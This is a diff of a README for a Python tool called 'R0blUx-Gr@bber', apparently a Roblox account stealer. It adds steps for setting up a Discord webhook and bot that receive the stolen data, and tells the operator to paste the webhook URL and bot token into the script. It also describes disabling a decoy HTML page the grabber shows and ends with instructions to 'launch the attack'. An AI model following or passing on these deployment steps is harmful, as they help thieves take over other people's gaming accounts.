@@ -87,6 +87,8 @@
 
 <div id="setup" align="center">
   <h1>Setup</h1>
+
+    
   <h3 id="webhook">WebHook Part.</h3>
    <h1>First, create a server private with nobody.</h1>
   <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/abbd809a-afba-4d8d-bed6-ea90bb324cef" alt="Screenshot 1">
@@ -97,13 +99,45 @@
   <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/b03eefcb-eda4-473f-aab5-fefee61e8f43" alt="Screenshot 3">
    <h1>Now save the URL at any places. It will be useful in the future.</h1>
   <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/536afae1-e8f8-4d6b-bda3-d7c93ed32970" alt="Screenshot 4">
-    <h3>Python Part.</h3>
+  <h1 id="bot">Discord Bot Part.</h3>
+  <h3>You now need to create discord bot but it's very simple just folow the step.</h1>
+  <h3>First go to <a href="https://discord.com/developers/applications">Discord Dev Portal.</a></h3>
+  <h3>Add a new app.</h3> 
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/754a2160-62ae-47a6-8255-00b2a3301a2f">
+  <h3>Name it whatever you want, accept the term and create.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/e2a8eb48-08a0-49a7-8b77-27e2ac32d292">
+  <h3>Go to bot button, and check these three checkboxes.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/719f53b4-c3bd-4d79-914f-d4b91e1ad132">
+  <h3>Then go up and reset the token and copy it and store it somewhere.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/06b0c53b-dfb2-435e-9fb2-e76f9cce2087">
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/b9ac664c-0d3d-4071-948d-c53aba28ed2d">
+  <h3>Then go to OAuth2, URL Generator.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/877eac76-795a-40ea-9ee1-1fbf34719d93">
+  <h3>Check the bot checkbox.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/cdea3e43-b159-491d-9a96-dd84d6d5d7c7">
+  <h3>And copy the Discord Bot invitation.</h3>
+  <h3>Then go to this URL.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/f7bab778-7b10-4558-a690-ff5817e2550b">
+  <h3>And allow it to the server we just created.</h3>
+  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/28903cd5-cdb3-40c0-ac51-308ce03fd726">
+  <h3>And authorize. And go to the pythnon part to continue.</h3>
+
+
+  
+
+
+
+
+
+<h3>Python Part.</h3>
 <h1>First, download the latest version of R0blUx-Gr@bber.py with requirements.bat:</h1>
 <p>Before you begin to modify, you will need to launch requirements.bat. This will automatically install all the requirements for the program to work.</p>
 <p>Now, you will need a text editor like Notepad++ or PyCharm Community Edition.</p>
 <p>If you prefer, you can use the default Notepad on your system as well.</p>
 <p>Now, open the R0blUx-Gr@bber.py file by right-clicking it and choosing "Edit" with your selected text editor.</p>
-<p>Locate line 428 and remove the preexisting text. Replace it with the webhook url that we save before if you dont have an webhook please click <a href="#webhook">here</a>  to know how to have one.</p>
+<p>Locate line 541 and remove the preexisting text. Replace it with the webhook url that we save before if you dont have an webhook please click <a href="#webhook">here</a>  to know how to have one.</p>
+<p>Also you need to add your discord bot token stored since 2 sec if you don't know what im talking about go <a href="#bot">here</a></p>
+<p>Also the grabber will show an defined html page you can disable it if you want by adding some # to the line 238, 239, 240.</p>
 <p>Once you have made the necessary modifications, you can save and close the file. Remember, the script is open-source, so you can customize it further if needed.</p>
 <p>If you're ready to launch the attack, you have two options:</p>
 <ul>
